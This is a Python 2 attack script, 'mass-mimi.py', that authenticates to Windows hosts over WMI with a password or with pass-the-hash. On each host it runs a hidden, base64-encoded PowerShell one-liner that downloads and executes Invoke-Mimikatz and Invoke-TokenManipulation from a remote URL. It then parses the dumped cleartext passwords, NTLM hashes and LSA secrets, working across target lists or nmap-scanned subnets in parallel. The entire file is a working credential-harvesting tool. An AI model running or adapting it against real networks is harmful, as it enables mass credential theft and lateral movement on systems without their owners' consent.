#!/usr/bin/env python

########################################################################
#
# name:     mass-mimi.py
# created:  Early 2016
# updated:  1/11/2017
# author:   rob antonucci
# descript: This script will execute mimikatz remotely via powershell
#           completely in memory.
#           https://github.com/clymb3r/PowerShell/blob/master/Invoke-
#           Mimikatz/Invoke-Mimikatz.ps1
# to do:    add argument variables (PTH, WMI, PSEXEC),
#           self contained HTTP server
# reqs:     https://github.com/coresecurity/impacket
#
########################################################################

import os
import sys
import subprocess
import base64
import argparse
import multiprocessing
import time
import getpass
from urllib import urlopen
from multiprocessing import Process, Queue

parser = argparse.ArgumentParser(
    formatter_class=argparse.RawDescriptionHelpFormatter,description=(
    "  ___ ___      __      ____    ____        ___ ___ /\_\    ___ ___ /\_\    \n" 
    "/' __` __`\  /'__`\   /',__\  /',__\     /' __` __`\/\ \ /' __` __`\/\ \   \n"
    "/\ \/\ \/\ \/\ \L\.\_/\__, `\/\__, `\    /\ \/\ \/\ \ \ \/\ \/\ \/\ \ \ \  \n"
    "\ \_\ \_\ \_\ \__/.\_\/\____/\/\____/    \ \_\ \_\ \_\ \_\ \_\ \_\ \_\ \_\ \n"
    " \/_/\/_/\/_/\/__/\/_/\/___/  \/___/      \/_/\/_/\/_/\/_/\/_/\/_/\/_/\/_/ \n"
    "                                                                           \n "
    "Run Invoke-Mimikatz.ps1 via WMI remotely\n"
    "massmimi.py -u administrator -p password -i 10.74.41.2 -v"))
parser.add_argument("-u", "--user",
    help="Username to authenticate as")
parser.add_argument("-p", "--password",
    help="Password to authenticate with, leave blank for prompt")
parser.add_argument("-l", "--hashes",
    help="Use LM:NTLM hashes")
parser.add_argument("-i", "--ip",
    help="Target IP to connect to")
parser.add_argument("-t", "--targets",
    help="List of targets")
parser.add_argument("-s", "--script",
    help="http://192.168.1.10/powershell/Invoke-Mimikatz-Custom.ps1")
parser.add_argument("-y", "--payload",
    help="Just show the payload", action="store_true")
parser.add_argument("-v", "--verbose",
    help="Show errors", action="store_true")
parser.add_argument("-n", "--nmap",
    help="Nmap a subnet to attack")
parser.add_argument("-d", "--dump-lsa",
    help="Dump a Domain Controller", action="store_true")
parser.add_argument("-o", "--output",
    help="Save Mimikatz output to a file, this will create a folder"
          " called results", action="store_true") 
args = parser.parse_args()

# check for incorrect use of arguments
if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)
if args.password and args.hashes:
    print "\n[-] You can not specify a password and a hash!!\n"
    sys.exit(1)
if args.ip and args.nmap:
    print "\n[-] You can not specify an ip and an Nmap scan!!\n"
    sys.exit(1)
if args.user and (not args.password and not args.hashes):
    password = getpass.getpass(stream=sys.stderr)
if (args.password or args.hashes) and not args.user:
    print "\n[-] Please specify a user!\n"
    sys.exit(1) 
if args.dump_lsa and not args.script:
    print "\n[-] Please specify a script for DumpLSA!\n"
    sys.exit(1)
if args.script:
    try:
        if urlopen(args.script).getcode() != 200:
            print "\n[-] That sript is not accessible.\n"
            sys.exit(1)            
    except:
        print "\n[-] That sript is not accessible.\n"
        sys.exit(1)
   
# set up variable names for the arguments
ip_address = args.ip
targets = args.targets
username = args.user
if args.password:
    password = args.password
nmap_subnet = args.nmap
current_time = time.strftime("%Y-%m%d-%H:%M:%S")
verbose = args.verbose
dump_lsa = args.dump_lsa

if args.user and (not args.password and not args.hashes):
    if not password:
        print "\n[-] Please specify either a password or hash!\n"
        parser.print_help()
        sys.exit(1) 

# if a custom script location is given use that instead of the
# github version
if args.script:
    script_location = args.script
else:
    script_location = (
        "https://raw.githubusercontent.com/mattifestation/PowerSploit"
        "/master/Exfiltration/Invoke-Mimikatz.ps1")
token_script_location = (
    "https://raw.githubusercontent.com/mattifestation/PowerSploit"
    "/master/Exfiltration/Invoke-TokenManipulation.ps1")

def encodeMimikatz():
    if dump_lsa:
        powershell_code = (
            "IEX (New-Object Net.WebClient).DownloadString(\"%s\");"
            "Invoke-Mimikatz -DumpLSA" % (script_location))
    else:
        powershell_code = (
            "IEX (New-Object Net.WebClient).DownloadString(\"%s\");"
            "Invoke-Mimikatz -Command 'privilege::debug token::elevate"
            " sekurlsa::logonpasswords lsadump::sam exit';"
            "IEX (New-Object Net.WebClient).DownloadString(\"%s\"); "
            "Invoke-TokenManipulation -Enumerate" % (script_location,
            token_script_location))
    powershell_code_encoded = ("powershell -nop -win hidden -noni -enc "
         + base64.b64encode(powershell_code.encode('utf_16_le')))
    return powershell_code_encoded

def invokeMimikatz(ip):
    ip = ip.strip()
    hashes = args.hashes
    # encode the command to be executed
    code = encodeMimikatz()
    if args.output:
        if os.path.isfile('results/%s.mimikatz' % ip):
            mimi_file = 'results/%s.mimikatz-%s' % (ip, current_time)
        else:
            mimi_file = 'results/%s.mimikatz' % ip
        if args.hashes:
            MIMIwmi = 'wmiexec.py -hashes %s %s@%s \"%s\" > %s' % (hashes,
                username, ip, code, mimi_file)
        else:
            MIMIwmi = 'wmiexec.py %s:%s@%s \"%s\" > %s' % (username,
                password, ip, code, mimi_file)
    else:
        if args.hashes:
            MIMIwmi = 'wmiexec.py -hashes %s %s@%s \"%s\"' % (hashes,
                username, ip, code)
        else:
            MIMIwmi = 'wmiexec.py %s:%s@%s \"%s\"' % (username,
                password, ip, code)
    try:
        mimi_out = subprocess.check_output(MIMIwmi, shell=True)
    except:
        if verbose:
            print "[-] wmiexec.py Error on %s" % ip
    try:
        mimi_out = mimi_out.split('\n')    
        for line in mimi_out:
            if (("SessionError" in line) or ("Connection refused" in line) or
                ("Access denied" in line) or ("access_denied" in line)):
                if verbose:
                    print "[-] SMB Error on %s" % ip
                if args.output:
                    os.remove(mimi_file)
                break
            elif "Connection timed out" in line:
                if verbose:
                    print "[-] Connection timed out on %s" % ip
                if args.output:
                    os.remove(mimi_file)
                break   
            elif "Errno Connection" in line:
                if verbose:
                    print "[-] Connection failed on %s" % ip
                if args.output:
                    os.remove(mimi_file)
                break                       
            elif "'powershell' is not recognized" in line:
                if verbose:
                    print ("[-] Login was successful but Powershell is not "
                        "installed on %s" % ip)
                if args.output:
                    os.remove(mimi_file)
                break   
            elif "Connection reset by peer" in line:
                if verbose:
                    print "[-] Login was reset on %s try again" % ip
                if args.output:
                    os.remove(mimi_file)
                break   
            elif "C:\\" in line:
                if verbose:
                    print ("[-] Login was successful on %s but cmd did not "
                        "execute." % ip)
                if args.output:
                    os.remove(mimi_file)
                break
            elif "Exception calling" in line:
                if verbose:
                    print ("[-] Login was successful on %s but cmd did not "
                        "execute." % ip)
                if args.output:
                    os.remove(mimi_file)
                break   
            elif "Missing expression after unary operator" in line:
                if verbose:
                    print ("[-] Login was successful on %s but cmd did not "
                        "execute." % ip)
                if args.output:
                    os.remove(mimi_file)
                break                                        
            elif "Bye!" in line:
                if verbose:
                    print "\n[*] Mimikatz ran on %s" % ip
                try:
                    lm_zero = '0' * 32
                    # Find NTLM hashes
                    ntlm = []
                    for i in range(0, len(mimi_out)):
                        line = mimi_out[i]
                        if 'Username' in line:
                            line_parse = "%s %s %s %s" % (line.strip(), 
                                mimi_out[i+1].strip(),mimi_out[i+2].strip(),
                                mimi_out[i+3].strip())
                            line_parse = line_parse.split()
                            if ('LM' in line_parse[9] and not 
                                line_parse[3].endswith('$')):
                                # Contains LM Hash and NTLM
                                if (len(line_parse[11]) == 32 and 
                                    len(line_parse[15]) == 32):
                                    ntlm.append("%s:%s:%s:%s" % (
                                        line_parse[3].strip(),line_parse[7].strip(),
                                        line_parse[11].strip(),line_parse[15].strip()))
                                # Contains only NTLM
                                elif len(line_parse[11]) == 32 and len(
                                    line_parse[15]) != 32:
                                    ntlm.append("%s:%s:%s:%s" % (
                                        line_parse[3].strip(),line_parse[7].strip(),
                                        lm_zero,line_parse[15].strip()))

                    # Find cleartext passwords
                    passwords = []
                    for i in range(0, len(mimi_out)):
                        line = mimi_out[i]
                        if 'Username' in line:
                            line_parse = "%s %s %s" % (line.strip(), 
                                mimi_out[i+1].strip(),mimi_out[i+2].strip())
                            if 'Password' in line_parse:
                                line_parse = line_parse.split()
                                if len(line_parse) <= 12:
                                    if not line_parse[3].endswith('$'):
                                        if not 'null'  in line_parse[11]:
                                            passwords.append("%s:%s:%s" % (
                                                line_parse[3].strip(),
                                                line_parse[7].strip(),
                                                line_parse[11].strip()))
                    # Parse LSA
                    lsa = []
                    for i in range(0, len(mimi_out)):
                        line = mimi_out[i]
                        if 'RID' in line:
                            line_parse = "%s %s %s %s" % (line.strip(), 
                                mimi_out[i+1].strip(),mimi_out[i+2].strip(),
                                mimi_out[i+3].strip())
                            line_parse = line_parse.split()
                            # these contain blank LM hash values
                            if len(line_parse) == 12:
                                lsa.append("%s:%s:%s:%s:::" % (
                                    line_parse[6].strip(),line_parse[3].strip()[1:-1],
                                    lm_zero,line_parse[11].strip()))
                            # these contain actual LM hash values
                            elif len(line_parse) > 12:
                                lsa.append("%s:%s:%s:%s:::" % (
                                    line_parse[6].strip(),line_parse[3].strip()[1:-1],
                                    line_parse[9].strip(),line_parse[12].strip()))


                    # remove duplicates
                    ntlm = list(set(ntlm))
                    passwords = list(set(passwords))

                    if len(passwords) > 0:
                        print "\n[+] Found clear text passwords for %s" % ip
                        print "--------------------------------------------"
                        for item in passwords:
                            print item
                    if len(ntlm) > 0:
                        print "\n[+] Found password hashes for %s" % ip
                        print "--------------------------------------------"
                        for item in ntlm:
                            print item
                    if len(lsa) > 0:
                        print "\n[+] Found LSA hashes for %s" % ip
                        print "--------------------------------------------"
                        for item in lsa:
                            print item   
                except:
                    if verbose:
                        print "[-] Couldn't parse results"
    except:
        pass
if __name__=='__main__':
    
    if args.payload:
        print encodeMimikatz()
        sys.exit(0)
    try:
        if args.output:
          os.makedirs('results')
    except:
        pass
    # if targets file is given run through it    
    if targets:
        f = open(targets, 'r')
        for scanip in f:
            jobs = []
            p = multiprocessing.Process(target=invokeMimikatz,
                args=(scanip,))
            jobs.append(p)
            p.start()
        f.close()
    # if nmap is given run through it
    elif nmap_subnet:
        if os.path.isfile('nmap-targets.py'):
            nmap = "./nmap-targets.py -p 445 -s %s" % nmap_subnet
            nmap_targets = subprocess.check_output(nmap, shell=True)
            if "No servers found" in nmap_targets:
                print ("[-] No servers found on %s with port 445 open!" 
                    % nmap_subnet)
                sys.exit(1)
            else:
                print nmap_targets.strip() + "\n"
                f = open('targets.txt', 'r')
                for scanip in f:
                    jobs = []
                    p = multiprocessing.Process(
                        target=invokeMimikatz, args=(scanip,))
                    jobs.append(p)
                    p.start()
                f.close()
        else:
            print "[-] nmap-targets.py not found"
    else:
        results = invokeMimikatz(ip_address)
